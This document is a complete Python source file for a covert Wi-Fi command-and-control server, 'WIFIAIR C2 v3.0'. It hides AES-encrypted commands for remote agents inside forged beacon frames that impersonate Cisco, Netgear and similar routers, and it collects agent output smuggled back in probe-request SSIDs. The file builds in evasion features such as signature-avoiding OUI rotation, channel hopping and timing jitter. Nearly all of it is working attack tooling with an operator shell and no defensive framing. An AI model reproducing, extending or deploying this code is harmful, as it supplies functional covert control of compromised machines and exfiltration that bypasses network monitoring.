#!/usr/bin/env python3
"""
WIFIAIR C2 Server v3.0 - Next Generation Covert Wi-Fi C2
=========================================================
Improvements over v2.0:
  1. AES-256-CTR encryption (replaces RC4)
  2. ACK/retransmit protocol (reliable delivery)
  3. OUI rotation (derived from PSK, no static signatures)
  4. Job queue (FIFO, multi-command pipeline)
  5. Channel hopping (shared PRNG schedule)
  6. Agent stealth awareness

Dependencies: scapy, pycryptodome
  pip install scapy pycryptodome
"""

import sys, time, struct, random, base64, os, threading, argparse, hashlib
from collections import deque, OrderedDict
from scapy.all import *
from Crypto.Cipher import AES
from Crypto.Util import Counter as CryptoCounter

# ============================================================================
#  CONFIGURATION
# ============================================================================
INTERFACE = "wlan0mon"
TAGS_PER_BEACON = 5

# --- PRE-SHARED KEY (AES-256 = 32 bytes) ---
PSK = bytes([
    0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
    0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01,
    0xA3, 0xB2, 0xC1, 0xD0, 0xE4, 0xF5, 0x06, 0x17,
    0x28, 0x39, 0x4A, 0x5B, 0x6C, 0x7D, 0x8E, 0x9F
])

# --- MESSAGE TYPES ---
MSG_CMD       = 0x01
MSG_ACK       = 0x02
MSG_RESPONSE  = 0x04

# --- FLAGS ---
FLAG_ENCRYPTED  = 0x02

# --- JITTER DEFAULTS ---
BEACON_JITTER_MIN = 0.08   # 80ms
BEACON_JITTER_MAX = 0.12   # 120ms
CYCLE_JITTER_MIN  = 0.05
CYCLE_JITTER_MAX  = 0.15

# --- CHANNEL HOPPING ---
CHANNELS     = [1, 6, 11]
HOP_INTERVAL = 10  # seconds per channel dwell

# --- ACK SETTINGS ---
ACK_DURATION = 30         # Broadcast ACK beacons for 30 seconds (background thread)
ACK_INTERVAL = 0.10       # 100ms between ACK beacons

# --- RESPONSE BUFFER TIMEOUT ---
RESPONSE_TIMEOUT = 300

# ============================================================================
#  DERIVED SESSION PARAMETERS (deterministic from PSK)
# ============================================================================
def derive_session_oui(psk):
    return hashlib.sha256(psk + b"WIFIAIR_OUI_V3").digest()[:3]

def derive_channel_seed(psk):
    return int.from_bytes(hashlib.sha256(psk + b"WIFIAIR_CHANNEL_HOP").digest()[:4], 'big')

SESSION_OUI   = derive_session_oui(PSK)
CHANNEL_SEED  = derive_channel_seed(PSK)

def get_current_channel():
    slot = int(time.time()) // HOP_INTERVAL
    h = ((CHANNEL_SEED + slot) * 2654435761) & 0xFFFFFFFF
    return CHANNELS[h % len(CHANNELS)]

# ============================================================================
#  SESSION IDENTITY
# ============================================================================
def generate_session_identity():
    vendor_prefixes = [
        ([0x00, 0x1A, 0x2B], "Cisco"),
        ([0x00, 0x1E, 0x58], "D-Link"),
        ([0x00, 0x24, 0xB2], "Netgear"),
        ([0x00, 0x26, 0x5A], "TP-Link"),
        ([0x00, 0x1C, 0x10], "Linksys"),
    ]
    ssid_options = ["xfinitywifi", "linksys", "NETGEAR", "ATT-WIFI-5G", "HOME-WIFI"]
    prefix, vendor = random.choice(vendor_prefixes)
    suffix = [random.randint(0x00, 0xFF) for _ in range(3)]
    bssid = ':'.join(f'{b:02x}' for b in prefix + suffix)
    ssid  = random.choice(ssid_options)
    return bssid, ssid, vendor

SESSION_BSSID, SESSION_SSID, SESSION_VENDOR = generate_session_identity()

# ============================================================================
#  GLOBAL STATE
# ============================================================================
job_queue          = deque()
current_job        = None
broadcast_active   = False
response_buffers   = {}
completed_responses = set()
listen_mode        = False
channel_hop_enabled = True
known_agents       = OrderedDict()
state_lock         = threading.Lock()

# ============================================================================
#  CRYPTO: AES-256-CTR
# ============================================================================
def aes256_ctr_encrypt(key, plaintext):
    nonce = os.urandom(12)
    ctr = CryptoCounter.new(32, prefix=nonce, initial_value=0, little_endian=False)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
    return nonce + cipher.encrypt(plaintext)

def aes256_ctr_decrypt(key, data):
    nonce      = data[:12]
    ciphertext = data[12:]
    ctr = CryptoCounter.new(32, prefix=nonce, initial_value=0, little_endian=False)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
    return cipher.decrypt(ciphertext)

# ============================================================================
#  UTILITY
# ============================================================================
def jitter(lo, hi):
    return random.uniform(lo, hi)

def job_id_int(jid_bytes):
    return (jid_bytes[0] << 8) | jid_bytes[1]

# ============================================================================
#  PACKET CRAFTING
# ============================================================================
def create_beacon(chunks_batch, channel):
    dot11  = Dot11(type=0, subtype=8,
                   addr1='ff:ff:ff:ff:ff:ff',
                   addr2=SESSION_BSSID,
                   addr3=SESSION_BSSID)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid  = Dot11Elt(ID='SSID', info=SESSION_SSID, len=len(SESSION_SSID))
    rates  = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
    dsset  = Dot11Elt(ID='DSset', info=bytes([channel]))
    pkt    = RadioTap()/dot11/beacon/essid/rates/dsset
    for chunk in chunks_batch:
        pkt = pkt / Dot11Elt(ID=221, info=chunk)
    return pkt

def build_ack_beacon(agent_id, job_id_bytes, channel):
    header = (SESSION_OUI
              + bytes([MSG_ACK, agent_id])
              + job_id_bytes
              + struct.pack('>HH', 1, 1)
              + bytes([0]))
    return create_beacon([header], channel)

# ============================================================================
#  JOB PREPARATION
# ============================================================================
def prepare_job(command, agent_id=0):
    """Encrypt -> base64 -> fragment into VSE chunks."""
    raw       = command.encode('utf-8')
    encrypted = aes256_ctr_encrypt(PSK, raw)
    payload   = base64.b64encode(encrypted)

    CHUNK_SZ = 243
    chunks   = [payload[i:i+CHUNK_SZ] for i in range(0, len(payload), CHUNK_SZ)]
    job_id   = struct.pack('>H', random.randint(1, 65535))
    total    = len(chunks)
    flags    = FLAG_ENCRYPTED

    prepared = []
    for seq, cdata in enumerate(chunks, 1):
        hdr = (SESSION_OUI
               + bytes([MSG_CMD, agent_id])
               + job_id
               + struct.pack('>H', seq)
               + struct.pack('>H', total)
               + bytes([flags]))
        prepared.append(hdr + cdata)

    return job_id, prepared, agent_id

# ============================================================================
#  JOB QUEUE
# ============================================================================
def enqueue_job(command, agent_id):
    job_id, chunks, aid = prepare_job(command, agent_id)
    job_queue.append((job_id, chunks, aid))
    target = "ALL" if aid == 0 else f"Agent {aid}"
    print(f"\033[92m[+] Queued Job 0x{job_id.hex()} -> {target} "
          f"({len(chunks)} chunks, queue depth: {len(job_queue)})\033[0m")
    if not broadcast_active:
        advance_queue()

def advance_queue():
    global current_job, broadcast_active
    with state_lock:
        if job_queue:
            current_job = job_queue.popleft()
            broadcast_active = True
            jid, chunks, aid = current_job
            target = "ALL" if aid == 0 else f"Agent {aid}"
            print(f"\033[92m[>] Broadcasting Job 0x{jid.hex()} -> {target} "
                  f"({len(chunks)} chunks)\033[0m")
        else:
            current_job = None
            broadcast_active = False

# ============================================================================
#  THREADS
# ============================================================================
def channel_hop_thread():
    last_ch = -1
    while True:
        if channel_hop_enabled:
            ch = get_current_channel()
            if ch != last_ch:
                os.system(f"iwconfig {INTERFACE} channel {ch} 2>/dev/null")
                last_ch = ch
        time.sleep(1)

def broadcast_thread():
    global broadcast_active
    while True:
        if broadcast_active and current_job:
            jid, chunks, aid = current_job
            ch = get_current_channel()
            for i in range(0, len(chunks), TAGS_PER_BEACON):
                if not broadcast_active:
                    break
                try:
                    batch = chunks[i:i+TAGS_PER_BEACON]
                    sendp(create_beacon(batch, ch), iface=INTERFACE, verbose=0)
                    time.sleep(jitter(BEACON_JITTER_MIN, BEACON_JITTER_MAX))
                except OSError:
                    broadcast_active = False
                    break
            time.sleep(jitter(CYCLE_JITTER_MIN, CYCLE_JITTER_MAX))
        else:
            time.sleep(0.1)

def ack_broadcast_thread(agent_id, job_id_bytes):
    """Background thread: broadcast ACK beacons for ACK_DURATION seconds."""
    end_time = time.time() + ACK_DURATION
    while time.time() < end_time:
        ch = get_current_channel()
        try:
            sendp(build_ack_beacon(agent_id, job_id_bytes, ch),
                  iface=INTERFACE, verbose=0)
        except OSError:
            break
        time.sleep(ACK_INTERVAL)

def response_cleanup_thread():
    while True:
        time.sleep(30)
        now = time.time()
        stale = [k for k, v in response_buffers.items()
                 if now - v['start_time'] > RESPONSE_TIMEOUT]
        for k in stale:
            print(f"\n\033[91m[!] Timeout: discarding incomplete response "
                  f"from Agent {k[0]} Job 0x{k[1]:04x}\033[0m")
            del response_buffers[k]

# ============================================================================
#  PROBE REQUEST HANDLER
# ============================================================================
def handle_probe(pkt):
    global response_buffers, completed_responses, known_agents

    if not pkt.haslayer(Dot11ProbeReq) or not pkt.haslayer(Dot11Elt):
        return

    try:
        ssid = pkt[Dot11Elt].info
        if not ssid or len(ssid) < 12 or ssid[:3] != SESSION_OUI:
            return

        msg_type = ssid[3]
        agent_id = ssid[4]
        job_id   = (ssid[5] << 8) | ssid[6]

        now = time.time()
        if agent_id != 0:
            if agent_id not in known_agents:
                known_agents[agent_id] = {
                    'last_seen': now, 'jobs_completed': 0
                }
                print(f"\n\033[96m[*] New agent discovered: Agent {agent_id}\033[0m")
                print("\033[94mC2>\033[0m ", end='', flush=True)
            known_agents[agent_id]['last_seen'] = now

        if msg_type == MSG_ACK:
            print(f"\n\033[92m[+] ACK from Agent {agent_id} for Job "
                  f"0x{job_id:04x} - command delivered\033[0m")
            if agent_id in known_agents:
                known_agents[agent_id]['jobs_completed'] += 1
            if current_job:
                cur_jid = job_id_int(current_job[0])
                if cur_jid == job_id:
                    advance_queue()
            print("\033[94mC2>\033[0m ", end='', flush=True)
            return

        if msg_type == MSG_RESPONSE:
            rkey = (agent_id, job_id)
            if rkey in completed_responses:
                return

            seq   = (ssid[7] << 8) | ssid[8]
            total = (ssid[9] << 8) | ssid[10]
            flags = ssid[11]
            data  = ssid[12:].decode('latin-1')

            if rkey not in response_buffers:
                print(f"\n\033[93m[<] Agent {agent_id} responding "
                      f"(Job 0x{job_id:04x}, {total} chunks)...\033[0m")
                print("\033[94mC2>\033[0m ", end='', flush=True)
                response_buffers[rkey] = {
                    'total': total, 'parts': {},
                    'start_time': time.time(), 'flags': flags
                }

            buf = response_buffers[rkey]
            if seq not in buf['parts']:
                buf['parts'][seq] = data

                if len(buf['parts']) == total:
                    completed_responses.add(rkey)
                    elapsed = time.time() - buf['start_time']

                    full_b64 = ''.join(buf['parts'][i] for i in range(1, total + 1))
                    try:
                        raw = base64.b64decode(full_b64)

                        if buf['flags'] & FLAG_ENCRYPTED:
                            plaintext = aes256_ctr_decrypt(PSK, raw)
                        else:
                            plaintext = raw

                        print(f"\n\033[92m{'='*60}")
                        print(f"[+] Agent {agent_id} | Job 0x{job_id:04x} | {elapsed:.1f}s")
                        print(f"{'='*60}\033[0m")
                        print(plaintext.decode('utf-8', errors='replace'))
                        print(f"\033[92m{'='*60}\033[0m")

                        # Launch ACK beacon broadcast in background (30s)
                        ack_jid = struct.pack('>H', job_id)
                        threading.Thread(
                            target=ack_broadcast_thread,
                            args=(agent_id, ack_jid),
                            daemon=True
                        ).start()

                        # Advance queue — response received proves command was delivered
                        if current_job:
                            cur_jid = job_id_int(current_job[0])
                            if cur_jid == job_id:
                                advance_queue()

                    except Exception as e:
                        print(f"\n\033[91m[-] Decryption error: {e}\033[0m")

                    del response_buffers[rkey]
                    print("\n\033[94mC2>\033[0m ", end='', flush=True)

    except Exception:
        pass

def sniffer_thread():
    sniff(iface=INTERFACE, prn=handle_probe,
          lfilter=lambda p: p.haslayer(Dot11ProbeReq), store=0)

# ============================================================================
#  INTERACTIVE SHELL
# ============================================================================
def print_help():
    oui_hex = SESSION_OUI.hex()
    print(f"""
\033[93m╔══════════════════════════════════════════════════════════════╗
║              WIFIAIR C2 Server v3.0 (Next-Gen)               ║
╠══════════════════════════════════════════════════════════════╣
║  send <agent> <cmd>  Send command (agent=0 for broadcast)    ║
║  stop                Stop current broadcast                  ║
║  skip                Stop current, broadcast next in queue   ║
║  queue               Show job queue                          ║
║  remove <#|jobid>    Remove job from queue by # or 0xID     ║
║  flush               Flush entire queue + stop broadcast     ║
║  status              Show server state                       ║
║  agents              List known agents                        ║
║  responses           Show pending response buffers           ║
║  jitter [min] [max]  Set beacon jitter (ms)                  ║
║  hop [on|off]        Toggle channel hopping                  ║
║  clear               Clear response history                  ║
║  help                Show this menu                          ║
║  exit                Quit                                    ║
╠══════════════════════════════════════════════════════════════╣
║  Session OUI: {oui_hex}  (derived from PSK)              ║
╚══════════════════════════════════════════════════════════════╝\033[0m
""")

def interactive():
    global broadcast_active, channel_hop_enabled
    global BEACON_JITTER_MIN, BEACON_JITTER_MAX, CYCLE_JITTER_MIN, CYCLE_JITTER_MAX

    threading.Thread(target=broadcast_thread, daemon=True).start()
    threading.Thread(target=channel_hop_thread, daemon=True).start()
    threading.Thread(target=response_cleanup_thread, daemon=True).start()

    if listen_mode:
        threading.Thread(target=sniffer_thread, daemon=True).start()
        print("\033[92m[+] Response listener ENABLED\033[0m")

    print(f"[*] Interface : {INTERFACE}")
    print(f"[*] Identity  : {SESSION_SSID} ({SESSION_VENDOR}) @ {SESSION_BSSID}")
    print(f"[*] Session OUI: {SESSION_OUI.hex()} (derived)")
    print(f"[*] Encryption: AES-256-CTR")
    print(f"[*] Jitter    : {BEACON_JITTER_MIN*1000:.0f}-{BEACON_JITTER_MAX*1000:.0f}ms")
    print(f"[*] Chan Hop  : {'ON' if channel_hop_enabled else 'OFF'} "
          f"(interval={HOP_INTERVAL}s, channels={CHANNELS})")
    print_help()

    while True:
        try:
            cmd = input("\n\033[94mC2>\033[0m ").strip()
            if not cmd:
                continue

            parts  = cmd.split(" ", 2)
            action = parts[0].lower()

            if action == "send":
                if len(parts) < 3:
                    print("\033[91m[-] Usage: send <agent_id> <command>\033[0m")
                    continue
                try:
                    agent_id = int(parts[1])
                    if agent_id < 0 or agent_id > 255:
                        raise ValueError
                except ValueError:
                    print("\033[91m[-] Agent ID must be 0-255\033[0m")
                    continue
                enqueue_job(parts[2], agent_id)

            elif action == "stop":
                broadcast_active = False
                print("[*] Broadcast stopped (queue untouched)")

            elif action == "skip":
                broadcast_active = False
                if job_queue:
                    advance_queue()
                else:
                    print("[*] Broadcast stopped, queue is empty")

            elif action == "queue":
                if job_queue:
                    print(f"\033[96m[*] Job queue ({len(job_queue)} pending):\033[0m")
                    for i, (jid, chunks, aid) in enumerate(job_queue):
                        target = "ALL" if aid == 0 else f"Agent {aid}"
                        print(f"    {i+1}. Job 0x{jid.hex()} -> {target} ({len(chunks)} chunks)")
                else:
                    print("[*] Job queue is empty")
                if current_job:
                    jid, chunks, aid = current_job
                    target = "ALL" if aid == 0 else f"Agent {aid}"
                    print(f"[*] Currently broadcasting: 0x{jid.hex()} -> {target}")

            elif action == "flush":
                job_queue.clear()
                broadcast_active = False
                print("[*] Queue flushed, broadcast stopped")

            elif action == "remove":
                if len(parts) < 2:
                    print("\033[91m[-] Usage: remove <queue#> or remove 0x<jobid>\033[0m")
                    continue
                arg = parts[1].strip()
                if not job_queue:
                    print("[*] Queue is empty")
                    continue
                # Try by hex job ID
                if arg.startswith("0x"):
                    try:
                        target_hex = arg[2:].lower()
                        found = False
                        new_queue = deque()
                        for jid, chunks, aid in job_queue:
                            if jid.hex() == target_hex:
                                found = True
                                t = "ALL" if aid == 0 else f"Agent {aid}"
                                print(f"\033[92m[+] Removed Job 0x{jid.hex()} -> {t}\033[0m")
                            else:
                                new_queue.append((jid, chunks, aid))
                        if not found:
                            print(f"\033[91m[-] Job 0x{target_hex} not found in queue\033[0m")
                        else:
                            job_queue.clear()
                            job_queue.extend(new_queue)
                    except Exception:
                        print("\033[91m[-] Invalid job ID\033[0m")
                else:
                    # By queue position (1-based)
                    try:
                        idx = int(arg) - 1
                        if idx < 0 or idx >= len(job_queue):
                            print(f"\033[91m[-] Invalid index. Queue has {len(job_queue)} items\033[0m")
                        else:
                            temp = list(job_queue)
                            jid, chunks, aid = temp.pop(idx)
                            t = "ALL" if aid == 0 else f"Agent {aid}"
                            print(f"\033[92m[+] Removed Job 0x{jid.hex()} -> {t}\033[0m")
                            job_queue.clear()
                            job_queue.extend(temp)
                    except ValueError:
                        print("\033[91m[-] Usage: remove <queue#> or remove 0x<jobid>\033[0m")

            elif action == "status":
                print(f"[*] Broadcasting : {broadcast_active}")
                print(f"[*] Identity     : {SESSION_SSID} @ {SESSION_BSSID}")
                print(f"[*] Session OUI  : {SESSION_OUI.hex()}")
                print(f"[*] Encryption   : AES-256-CTR")
                print(f"[*] Channel Hop  : {'ON' if channel_hop_enabled else 'OFF'} "
                      f"(current ch={get_current_channel()})")
                if current_job:
                    jid, chunks, aid = current_job
                    target = "ALL" if aid == 0 else f"Agent {aid}"
                    print(f"[*] Current Job  : 0x{jid.hex()} -> {target}")
                print(f"[*] Queue Depth  : {len(job_queue)}")
                print(f"[*] Known Agents : {len(known_agents)}")
                print(f"[*] Pending Resp : {len(response_buffers)}")
                print(f"[*] Jitter       : {BEACON_JITTER_MIN*1000:.0f}-"
                      f"{BEACON_JITTER_MAX*1000:.0f}ms")

            elif action == "agents":
                if known_agents:
                    print("\033[96m[*] Known Agents:\033[0m")
                    now = time.time()
                    for aid, info in known_agents.items():
                        seen_ago = now - info['last_seen']
                        status   = "\033[92mALIVE\033[0m" if seen_ago < 60 else \
                                   "\033[93mSTALE\033[0m" if seen_ago < 300 else \
                                   "\033[91mLOST\033[0m"
                        print(f"    Agent {aid:3d} | {status} | "
                              f"seen {seen_ago:.0f}s ago | "
                              f"jobs {info['jobs_completed']}")
                else:
                    print("[*] No agents discovered yet")

            elif action == "hop":
                if len(parts) >= 2 and parts[1].lower() in ("on", "off"):
                    channel_hop_enabled = parts[1].lower() == "on"
                    print(f"[*] Channel hopping {'ENABLED' if channel_hop_enabled else 'DISABLED'}")
                else:
                    print(f"[*] Channel hopping: {'ON' if channel_hop_enabled else 'OFF'} "
                          f"(current ch={get_current_channel()})")
                    print("    Usage: hop on | hop off")

            elif action == "jitter":
                jp = cmd.split()
                if len(jp) == 1:
                    print(f"[*] Current jitter: {BEACON_JITTER_MIN*1000:.0f}-"
                          f"{BEACON_JITTER_MAX*1000:.0f}ms")
                elif len(jp) >= 3:
                    try:
                        lo = float(jp[1]) / 1000.0
                        hi = float(jp[2]) / 1000.0
                        if lo > hi: lo, hi = hi, lo
                        BEACON_JITTER_MIN, BEACON_JITTER_MAX = lo, hi
                        CYCLE_JITTER_MIN = lo * 1.5
                        CYCLE_JITTER_MAX = hi * 1.5
                        print(f"\033[92m[+] Jitter set: {lo*1000:.0f}-{hi*1000:.0f}ms\033[0m")
                    except ValueError:
                        print("\033[91m[-] Invalid values\033[0m")
                else:
                    print("[-] Usage: jitter <min_ms> <max_ms>")

            elif action == "responses":
                if response_buffers:
                    print("\033[96m[*] Pending responses:\033[0m")
                    for (aid, jid), buf in response_buffers.items():
                        recv  = len(buf['parts'])
                        total = buf['total']
                        pct   = int((recv / total) * 20)
                        bar   = '█' * pct + '░' * (20 - pct)
                        elapsed = time.time() - buf['start_time']
                        print(f"    Agent {aid} | Job 0x{jid:04x} | "
                              f"[{bar}] {recv}/{total} | {elapsed:.1f}s")
                else:
                    print("[*] No pending responses")

            elif action == "clear":
                response_buffers.clear()
                completed_responses.clear()
                print("[*] Cleared buffers & history")

            elif action in ("exit", "quit"):
                break

            elif action == "help":
                print_help()

            else:
                print(f"\033[91m[-] Unknown: {action}\033[0m  (type 'help')")

        except KeyboardInterrupt:
            print("\n[*] Use 'exit' to quit")

# ============================================================================
#  MAIN
# ============================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='WIFIAIR C2 Server v3.0')
    parser.add_argument('-listen', action='store_true', help='Enable response listener')
    parser.add_argument('-i', '--interface', default='wlan0mon', help='Wi-Fi interface')
    parser.add_argument('-jitter', type=int, nargs=2, metavar=('MIN', 'MAX'),
                        help='Beacon jitter in ms (default: 80-120)')
    parser.add_argument('-nohop', action='store_true', help='Disable channel hopping')
    parser.add_argument('-channel', type=int, default=None,
                        help='Fixed channel (implies -nohop)')
    args = parser.parse_args()

    INTERFACE   = args.interface
    listen_mode = args.listen

    if args.jitter:
        BEACON_JITTER_MIN = args.jitter[0] / 1000.0
        BEACON_JITTER_MAX = args.jitter[1] / 1000.0
        CYCLE_JITTER_MIN  = BEACON_JITTER_MIN * 1.5
        CYCLE_JITTER_MAX  = BEACON_JITTER_MAX * 1.5

    if args.nohop or args.channel:
        channel_hop_enabled = False
        ch = args.channel if args.channel else 6
        os.system(f"iwconfig {INTERFACE} channel {ch}")
        print(f"[*] Fixed channel: {ch}")
    else:
        ch = get_current_channel()
        os.system(f"iwconfig {INTERFACE} channel {ch}")

    print("""
\033[96m
 __        _____ _____ ___    _    ___ ____
 \\ \\      / /_ _|  ___|_ _|  / \\  |_ _|  _ \\
  \\ \\ /\\ / / | || |_   | |  / _ \\  | || |_) |
   \\ V  V /  | ||  _|  | | / ___ \\ | ||  _ <
    \\_/\\_/  |___|_|   |___/_/   \\_\\___|_| \\_\\
\033[0m""")
    print("\033[93m[*] WIFIAIR C2 Server v3.0 (Next-Gen)\033[0m")
    print(f"\033[93m[*] AES-256-CTR | ACK | Channel Hop | Job Queue\033[0m")

    interactive()
